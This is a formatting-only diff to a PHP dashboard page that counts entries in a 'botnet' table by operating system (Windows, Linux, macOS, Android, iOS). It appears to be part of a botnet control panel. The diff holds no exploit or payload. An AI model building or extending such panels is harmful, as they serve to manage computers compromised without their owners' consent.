@@ -5,11 +5,11 @@
 		padding: 15px;
 		min-width: 800px;
 	}
-	
-	.demo-card-wide> .mdl-card__menu {
+
+	.demo-card-wide>.mdl-card__menu {
 		color: #fff;
 	}
-	
+
 	td {
 		border: 1px solid;
 	}
@@ -24,44 +24,44 @@
 			<li class="mdl-list__item">
 				<i class="fab fa-windows"></i>
 				<span class="mdl-list__item-primary-content">
-		Windows systems: <?php 
-		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='WINDOWS'");
-		$stmt->execute();
-		$result = $stmt->get_result();
-		while($row = $result->fetch_assoc()) {
-			echo $row[total];
-		}
-		?>
-		 </span>
-			
+					Windows systems: <?php
+										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='WINDOWS'");
+										$stmt->execute();
+										$result = $stmt->get_result();
+										while ($row = $result->fetch_assoc()) {
+											echo $row[total];
+										}
+										?>
+				</span>
+
 			</li>
 			<li class="mdl-list__item">
 				<i class="fab fa-linux"></i>
 				<span class="mdl-list__item-primary-content">
-		Linux systems (*): <?php 
-		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='LINUX'");
-		$stmt->execute();
-		$result = $stmt->get_result();
-		while($row = $result->fetch_assoc()) {
-			echo $row[total];
-		}
-		?>
-		 </span>
-			
+					Linux systems (*): <?php
+										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='LINUX'");
+										$stmt->execute();
+										$result = $stmt->get_result();
+										while ($row = $result->fetch_assoc()) {
+											echo $row[total];
+										}
+										?>
+				</span>
+
 			</li>
 			<li class="mdl-list__item">
 				<i class="fab fa-apple"></i>
 				<span class="mdl-list__item-primary-content">
-		macOs systems (*): <?php 
-		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='MACOS'");
-		$stmt->execute();
-		$result = $stmt->get_result();
-		while($row = $result->fetch_assoc()) {
-			echo $row[total];
-		}
-		?>
-		 </span>
-			
+					macOs systems (*): <?php
+										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='MACOS'");
+										$stmt->execute();
+										$result = $stmt->get_result();
+										while ($row = $result->fetch_assoc()) {
+											echo $row[total];
+										}
+										?>
+				</span>
+
 			</li>
 		</ul>
 		<h5>Mobile</h5>
@@ -69,30 +69,30 @@
 			<li class="mdl-list__item">
 				<i class="fab fa-android"></i>
 				<span class="mdl-list__item-primary-content">
-		Android systems (*): <?php 
-		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='ANDROID'");
-		$stmt->execute();
-		$result = $stmt->get_result();
-		while($row = $result->fetch_assoc()) {
-			echo $row[total];
-		}
-		?>
-		 </span>
-			
+					Android systems (*): <?php
+											$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='ANDROID'");
+											$stmt->execute();
+											$result = $stmt->get_result();
+											while ($row = $result->fetch_assoc()) {
+												echo $row[total];
+											}
+											?>
+				</span>
+
 			</li>
 			<li class="mdl-list__item">
 				<i class="fas fa-mobile"></i>
 				<span class="mdl-list__item-primary-content">
-		iOS systems (*): <?php 
-		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='IOS'");
-		$stmt->execute();
-		$result = $stmt->get_result();
-		while($row = $result->fetch_assoc()) {
-			echo $row[total];
-		}
-		?>
-		 </span>
-			
+					iOS systems (*): <?php
+										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='IOS'");
+										$stmt->execute();
+										$result = $stmt->get_result();
+										while ($row = $result->fetch_assoc()) {
+											echo $row[total];
+										}
+										?>
+				</span>
+
 			</li>
 		</ul>
 		Note:<br />
